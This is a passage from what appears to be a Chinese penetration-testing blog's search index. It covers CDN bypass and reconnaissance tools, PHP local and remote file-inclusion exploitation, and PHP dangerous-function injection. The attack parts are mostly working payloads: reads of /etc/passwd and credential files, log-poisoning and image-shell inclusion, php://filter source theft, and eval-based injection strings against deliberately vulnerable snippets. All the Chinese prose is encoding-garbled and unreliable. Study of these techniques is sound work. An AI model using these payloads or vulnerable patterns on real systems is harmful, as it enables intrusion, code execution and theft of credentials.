é™„ä»¶</p></li><li><p>å›½å¤–DNSï¼šåˆ©ç”¨å›½å†…ç½‘ç«™ä¸åœ¨å›½å¤–åšCDNçš„ç‰¹ç‚¹ï¼Œä½¿ç”¨å›½å¤–çš„DNSè§£æï¼Œæ„Ÿè°¢â€<a href="https://www.freebuf.com/articles/web/179043.html" target="_blank" rel="noopener">ç»éªŒåˆ†äº«ï½œè°ˆè°ˆæ¸—é€æµ‹è¯•ä¸­çš„ä¿¡æ¯æœé›†</a>â€œæä¾›äº†ä»¥ä¸‹å†·é—¨çš„DNSï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">209.244.0.3</span><br><span class="line">64.6.64.6</span><br><span class="line">8.8.8.8</span><br><span class="line">9.9.9.9</span><br><span class="line">8.26.56.26</span><br><span class="line">199.85.126.10</span><br><span class="line">208.67.222.222</span><br><span class="line">195.46.39.39</span><br><span class="line">69.195.152.204</span><br><span class="line">208.76.50.50</span><br><span class="line">216.146.35.35</span><br><span class="line">37.235.1.174</span><br><span class="line">198.101.242.72</span><br><span class="line">77.88.8.8</span><br><span class="line">91.239.100.100</span><br><span class="line">74.82.42.42</span><br><span class="line">109.69.8.51</span><br><span class="line">156.154.70.1</span><br><span class="line">1.1.1.1</span><br><span class="line">45.77.165.194</span><br></pre></td></tr></table></figure></li><li><p>é‚®ç®±ï¼šé‚®ä»¶æœåŠ¡å™¨æ— æ³•CDNï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ç½‘ç«™çš„é‚®ä»¶å‘é€åŠŸèƒ½ï¼ˆå¦‚å¯†ç æ‰¾å›ç­‰ï¼‰è·å–åŸIPï¼Œå½“ç„¶è¦ç¡®ä¿ç½‘ç«™çš„é‚®ä»¶æœåŠ¡å™¨ç”¨çš„æ˜¯è‡ªå·±çš„ã€‚</p></li><li><p>å…¨ç½‘æ‰«æï¼šæœ€ç¬¨çš„åŠæ³•æ˜¯ä½¿ç”¨å·¥å…·æ‰«æå…¨ç½‘çš„IPæ®µï¼š</p><ul><li>zmapï¼Œ<a href="https://github.com/zmap/zgrab" target="_blank" rel="noopener">zgrab</a>(<a href="https://www.t00ls.net/articles-40631.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-40631.html</a>)</li><li>fuckcdn.exe</li><li>w8Fuckcdn</li></ul></li><li><p>ç½‘ç«™æ¼æ´ï¼Œå¦‚ï¼š</p><ul><li>SSRF</li><li>phpinfo</li></ul></li></ul><h2 id="æœåŠ¡å™¨ç³»ç»Ÿ"><a href="#æœåŠ¡å™¨ç³»ç»Ÿ" class="headerlink" title="æœåŠ¡å™¨ç³»ç»Ÿ"></a>æœåŠ¡å™¨ç³»ç»Ÿ</h2><ul><li>ç½‘å€å¤§å°å†™æ˜¯å¦æ•æ„Ÿåˆ¤æ–­Windows/Linux</li><li>nmapè¯†åˆ«ç³»ç»Ÿ</li></ul><h2 id="å¼€æ”¾ç«¯å£"><a href="#å¼€æ”¾ç«¯å£" class="headerlink" title="å¼€æ”¾ç«¯å£"></a>å¼€æ”¾ç«¯å£</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sT -p- -sV 127.0.0.1</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨ç«¯å£æœ‰ï¼š</p><p>3306 mysql<br>1433 mssql<br>1521 oracle<br>5432 postgresql<br>6379 redis<br>27017 mongodb<br>8080 tomcat/resin/jetty<br>137 samba<br>873 rsync<br>5900 vnc</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>ä»HTTPå¤´éƒ¨è·å–WAFä¿¡æ¯</p><ul><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></li><li><code>wafw00f -a åŸŸå</code></li></ul><h1 id="å­åŸŸåã€Cæ®µã€æ—ç«™"><a href="#å­åŸŸåã€Cæ®µã€æ—ç«™" class="headerlink" title="å­åŸŸåã€Cæ®µã€æ—ç«™"></a>å­åŸŸåã€Cæ®µã€æ—ç«™</h1><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><ul><li>æš´åŠ›æšä¸¾<ul><li>(dnsrecon)[<a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a>]</li><li>subDomainsBrute</li><li>layerå­åŸŸåæŒ–æ˜æœº</li></ul></li><li>æœç´¢å¼•æ“<ul><li>site: anemone.top</li><li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li><li>Sublist3rï¼ˆé›†åˆå¤šå®¶æœç´¢å¼•æ“ç»“æœï¼‰</li></ul></li><li>ä½¿ç”¨SSL/TLSè¯ä¹¦æŸ¥è¯¢<ul><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ul></li></ul><h2 id="Cç«™æŸ¥è¯¢"><a href="#Cç«™æŸ¥è¯¢" class="headerlink" title="Cç«™æŸ¥è¯¢"></a>Cç«™æŸ¥è¯¢</h2><ul><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a></li><li><code>nmap -p 80,8080 --open ip/24</code></li></ul><h2 id="æ—ç«™æŸ¥è¯¢"><a href="#æ—ç«™æŸ¥è¯¢" class="headerlink" title="æ—ç«™æŸ¥è¯¢"></a>æ—ç«™æŸ¥è¯¢</h2><ul><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li></ul><h1 id="ç½‘ç«™ç›®å½•"><a href="#ç½‘ç«™ç›®å½•" class="headerlink" title="ç½‘ç«™ç›®å½•"></a>ç½‘ç«™ç›®å½•</h1><p>å¯èƒ½æ³„éœ²çš„ç›®å½•æœ‰ï¼š</p><ul><li>ç½‘ç«™åå°</li><li>ç½‘ç«™æºä»£ç å¤‡ä»½ï¼Œå¦‚:<ul><li>www.rar</li><li>www.zip</li></ul></li><li>ç‰ˆæœ¬æ§åˆ¶<ul><li>/.git/config ï¼ˆåˆ©ç”¨ï¼š<a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">GitTools</a>ï¼Œ<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker</a>ï¼‰</li><li>/.svn/entries ï¼ˆåˆ©ç”¨ï¼šSeay SVNæ¼æ´åˆ©ç”¨å·¥å…·ï¼‰</li></ul></li><li>JavaWebç›®å½•<ul><li>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</li><li>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <strong>class</strong> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ <strong>servlet</strong> <strong>class</strong> å’Œé<strong>servlet</strong> <strong>class</strong>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .<strong>jar</strong>æ–‡ä»¶ä¸­</li><li>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</li><li>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</li><li>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</li></ul></li><li>å…¶ä»–æ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼Œå¦‚ï¼š<ul><li>phpinfo</li><li>robots.txt</li><li>.DS_Store(<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a>)</li></ul></li></ul><p>æ¨èå·¥å…·æœ‰ï¼š</p><ul><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li><li>å¾¡å‰‘ï¼Œ<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a></li></ul><h1 id="å…¶ä»–ä¿¡æ¯"><a href="#å…¶ä»–ä¿¡æ¯" class="headerlink" title="å…¶ä»–ä¿¡æ¯"></a>å…¶ä»–ä¿¡æ¯</h1><ul><li>GitHubæºç <ul><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li></ul></li><li>ç½‘ç»œèµ„äº§æœç´¢å¼•æ“ï¼š<ul><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li></ul></li></ul><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>ä¿¡æ¯æ”¶é›†æ€»ç»“ï¼Œ<a href="https://blog.csdn.net/qq_33336310/article/details/86665344" target="_blank" rel="noopener">https://blog.csdn.net/qq_33336310/article/details/86665344</a></li><li>Webå®‰å…¨ â€” ä¿¡æ¯æ”¶é›†<a href="https://www.freebuf.com/column/155795.html" target="_blank" rel="noopener">https://www.freebuf.com/column/155795.html</a></li><li>ä»–å±±ä¹‹çŸ³ | æ¸—é€æµ‹è¯•ä¸­çš„å„ç§å­åŸŸåæšä¸¾æŠ€æœ¯ä»‹ç»ï¼Œ<a href="https://www.freebuf.com/articles/web/154809.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/154809.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯æ”¶é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> wafæ¢æµ‹ </tag>
            
            <tag> cdnç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</title>
      <link href="/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/"/>
      <url>/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><p>æœ¬åœ°æ–‡ä»¶åŒ…å«å¯ä»¥ä½œä¸ºæ–‡ä»¶è¯»å–ä½¿ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/include.php?file=/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">...</span><br></pre></td></tr></table></figure><a id="more"></a><p>å¯è¯»å¦‚ä¸‹æ•æ„Ÿæ–‡ä»¶ï¼š</p><ul><li>Windows:<ul><li>C:\boot.ini    //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</li><li>C:\Windows\System32\inetsrv\MetaBase.xml    //IISé…ç½®æ–‡ä»¶</li><li>C:\Windows\repair\sam        //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </li><li>C:\Program Files\mysql\my.ini         //Mysqlé…ç½®</li><li>C:\Program Files\mysql\data\mysql\user.MYD    //Mysql root</li><li>C:\Windows\php.ini    //phpé…ç½®ä¿¡æ¯</li><li>C:\Windows\my.ini        //Mysqlé…ç½®ä¿¡æ¯</li></ul></li><li>Linux:<ul><li>~/.ssh/authorized_keys</li><li>/etc/passwd</li><li>/etc/my.cnf</li><li>/etc/httpd/conf/httpd.conf</li><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access_log</li></ul></li></ul><h2 id="åŒ…å«å›¾ç‰‡é©¬GetShell"><a href="#åŒ…å«å›¾ç‰‡é©¬GetShell" class="headerlink" title="åŒ…å«å›¾ç‰‡é©¬GetShell"></a>åŒ…å«å›¾ç‰‡é©¬GetShell</h2><p>é¦–å…ˆä¸Šä¼ å›¾ç‰‡é©¬img.gif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååŒ…å«å›¾ç‰‡é©¬ï¼Œåç¼€åæ— é™åˆ¶ï¼š</p><p><img src="/php-æ–‡ä»¶åŒ…å«åˆ©ç”¨/1549593738249.png" alt="1549593738249"></p><h2 id="åŒ…å«æ—¥å¿—GetShell"><a href="#åŒ…å«æ—¥å¿—GetShell" class="headerlink" title="åŒ…å«æ—¥å¿—GetShell"></a>åŒ…å«æ—¥å¿—GetShell</h2><p>å…ˆè®¿é—®<code>/include.php?file=&lt;?=&#96;ls&#96;?&gt;</code>ï¼Œå°†å‘½ä»¤å†™å…¥æ—¥å¿—ã€‚</p><p><img src="/php-æ–‡ä»¶åŒ…å«åˆ©ç”¨/1549594868535.png" alt="1549594868535"></p><p>å†åŒ…å«æ—¥å¿—GetShellï¼š</p><p><img src="/php-æ–‡ä»¶åŒ…å«åˆ©ç”¨/1549594747532.png" alt="1549594747532"></p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p><code>php://filter</code>å¯ä»¥ç”¨æ¥ç»“åˆbase64è¯»å–phpæºä»£ç ï¼Œpayloadä¸ºï¼š<code>php://filter/read=convert.base64-encode/resource=include.php</code></p><p><img src="/php-æ–‡ä»¶åŒ…å«åˆ©ç”¨/1549595279613.png" alt="1549595279613"></p><h2 id="ç»•è¿‡é™åˆ¶"><a href="#ç»•è¿‡é™åˆ¶" class="headerlink" title="ç»•è¿‡é™åˆ¶"></a>ç»•è¿‡é™åˆ¶</h2><ul><li>%00æˆªæ–­<ul><li>?file=../../../etc/pwd%00</li></ul></li><li>è·¯å¾„é•¿åº¦é˜¶æ®µ<ul><li>?file=../../../etc/pwd/././.[â€¦]/././.</li><li>?file=../../../boot.ini/â€¦.[â€¦]â€¦â€¦â€¦</li></ul></li></ul><h1 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h1><p>éœ€è¦All_url_fopen=On(é»˜è®¤å¼€å¯)å’ŒAllow_url_include=On(é»˜è®¤å…³é—­)</p><h2 id="ç›´æ¥åŒ…å«è¿œç¨‹ä¸€å¥è¯"><a href="#ç›´æ¥åŒ…å«è¿œç¨‹ä¸€å¥è¯" class="headerlink" title="ç›´æ¥åŒ…å«è¿œç¨‹ä¸€å¥è¯"></a>ç›´æ¥åŒ…å«è¿œç¨‹ä¸€å¥è¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?file=http://127.0.0.2/a.txt</span><br></pre></td></tr></table></figure><p>a.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                         <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>å¯ä»¥å°†postéƒ¨åˆ†è¯·æ±‚ä½œä¸ºä¸€ä¸ªphpçš„åªè¯»æ–‡ä»¶æµ</p><p><img src="/php-æ–‡ä»¶åŒ…å«åˆ©ç”¨/1549596283877.png" alt="1549596283877"></p><p>ç”Ÿæˆä¸€å¥è¯payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                            <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ<a href="https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html" target="_blank" rel="noopener">https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html</a></li><li>æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ<a href="https://www.cnblogs.com/bmjoker/p/9035259.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9035259.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPä¸­çš„å±é™©å‡½æ•°å’Œä¼ªåè®®</title>
      <link href="/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>å¤ä¹ ä¸€ä¸‹PHPä¸­å¸¸è§çš„å±é™©å‡½æ•°ï¼š</p><h1 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h1><ul><li><p>file_get_contents()ï¼Œè¯¥å‡½æ•°å¯ä»¥è¯»å–å…¶ä»–åè®®é€ æˆSSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$src=$_GET[<span class="string">'src'</span>];</span><br><span class="line">$homepage = file_get_contents($src);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br></pre></td></tr></table></figure></li><li><p>highlight_file()ï¼Œé«˜äº®æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</p></li><li>show_source()ï¼Œhighlight_file()çš„åˆ«å</li><li>fopen()ã€fread()ï¼Œfgets()ã€fgetss()ã€fpassthru()ç­‰<ul><li>fread(fopen($filename,â€râ€), $size); //è¯»å–<code>$size</code>é•¿åº¦çš„æ–‡ä»¶</li><li>fgets(fopen($filename, â€œrâ€)); //è¯»å–ä¸€è¡Œ</li><li>fgetss(fopen($filename, â€œrâ€)); //è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤HTMLæ ‡è®°</li><li>fpassthru(fopen($filename, â€œrâ€)); //è¯»å–åˆ°æ–‡ä»¶ç»“æŸ</li></ul></li><li><p>readfile()ï¼Œè¯»å–æ–‡ä»¶å¹¶è¿”å›è‡³é¡µé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($file)) &#123;</span><br><span class="line">    header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">    header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment;   filename="'</span>.basename($file).<span class="string">'"'</span>);</span><br><span class="line">    header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">    header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">    header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">    readfile($file);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>file()ï¼ŒæŠŠæ–‡ä»¶è¯»è¿›æ•°ç»„ä¸­</p></li><li>php_strip_whitespace()ï¼Œè¯»å–ä¸€ä¸ªphpæ–‡ä»¶å¹¶è¿”å›ä¸€ä¸ªå»æ‰æ³¨é‡Šå’Œæ¢è¡Œçš„æ–‡æœ¬ï¼Œæœ‰æ„æ€çš„æ˜¯ï¼Œè¯¥å‡½æ•°å¯ä»¥å»æ‰ä»»æ„è¯­è¨€çš„æ³¨é‡Šï¼Œåªè¦è¿™ä¸ªè¯­è¨€çš„æ³¨é‡Šé£æ ¼ä¸phpç›¸åŒå¹¶ä¸”åœ¨æ–‡ä»¶å¤´åŠ å…¥<code>&lt;?php</code>å°±è¡Œå¯ï¼š<br><img src="/php-PHPä¸­çš„å±é™©å‡½æ•°å’Œä¼ªåè®®/1549526799636.png" alt="1549526799636"></li><li>parse_ini_file()ï¼Œåªèƒ½è¯»å–iniæ–‡ä»¶</li></ul><a id="more"></a><h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><ul><li>system()</li><li>shell_exec()ï¼Œå’Œ<code>system()</code>å·®ä¸å¤š</li><li>passthru()ï¼Œè¿”å›äºŒè¿›åˆ¶çš„è¾“å‡º</li><li>exec(â€˜lsâ€™, $array)ï¼Œè¿”å›ç»“æœä¿å­˜åœ¨<code>array</code>ä¸­</li><li>pcntl_exec()ï¼Œä¸è¿”å›ç»“æœ</li><li><p>popen()ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</span><br><span class="line">var_dump(fpassthru($handle));</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure></li><li><p>proc_open()ï¼Œå¢å¼ºå‹<code>popen()</code>ï¼Œå…è®¸æœ‰ä¸‰ä¸ªé€šé“ï¼ˆè¾“å…¥ï¼Œè¾“å‡ºï¼Œé”™è¯¯ï¼‰</p></li><li>&#96;(åå•å¼•å·)</li><li>escapeshellcmd() // è¯¥å‡½æ•°ç”¨äºè¿‡æ»¤å­—ç¬¦ä¿è¯ä¸æ‰§è¡Œå…¶ä»–æ¶æ„æŒ‡ä»¤</li></ul><h1 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h1><ul><li>eval(â€œphpinfo();â€)</li><li><p>assert()ï¼ŒåŸç”¨æ³•æ˜¯assertå¤±è´¥åï¼Œè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå®ƒä¼šå°†å‚æ•°ä½œä¸ºä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line">assert(<span class="string">"is_int($num)"</span>);</span><br></pre></td></tr></table></figure><p>payloadä¸º<code>num=1)%20and%20phpinfo();//</code>ï¼Œæ³¨æ„è‹¥å‰é¢çš„æ¡ä»¶ä¸æ»¡è¶³åˆ™ç”¨orï¼Œå¦‚<code>a)%20or%20phpinfo();//</code></p></li><li><p>preg_replace + â€˜/eâ€™,/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>,$_GET[<span class="string">"cmd"</span>],<span class="string">"just test"</span>);</span><br></pre></td></tr></table></figure><p>payloadä¸º<code>cmd=phpinfo()</code>ï¼Œæ³¨æ„è¯¥æ–¹æ³•åªåœ¨php 5.5.0ä»¥ä¸‹ç‰ˆæœ¬æœ‰æ•ˆã€‚</p></li><li><p>create_function($args, â€‹$code)ï¼Œåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç”±äºå†…éƒ¨æ˜¯evalå®ç°çš„ï¼Œæ‰€ä»¥å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œå¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sort_by = $_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'1234'</span>,<span class="string">'4321'</span>);</span><br><span class="line">$sort_function = <span class="string">'return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]);'</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br><span class="line">print_r($databases);</span><br></pre></td></tr></table></figure><p>æ„é€ payloadçš„å…³é”®åœ¨äºå°†create_functionè¿˜åŸä¸ºevalå®ç°çš„æ™®é€šå‡½æ•°ï¼Œæ¥ç€æŒ‰ä¸Šä¸‹æ–‡é—­åˆå…ˆå‰çš„å‡½æ•°é€»è¾‘ï¼ˆè¿™é‡Œä¸ºstrcmpï¼‰å†åŠ ä¸Šå…¶ä»–è¯­å¥<code>;}phpinfo();/*</code>ï¼Œæ€»ä¹‹ç¡®ä¿evalä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªphpç¬¦åˆè¯­æ³•çš„è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">    <span class="string">'function lambda($a, $b)&#123;</span></span><br><span class="line"><span class="string">        return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]); //replace with create_function</span></span><br><span class="line"><span class="string">    &#125;'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>ç”±æ­¤payloadä¸º<code>sort_by=&quot;]);}phpinfo();/*</code>ï¼Œæ­¤æ—¶evalä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span 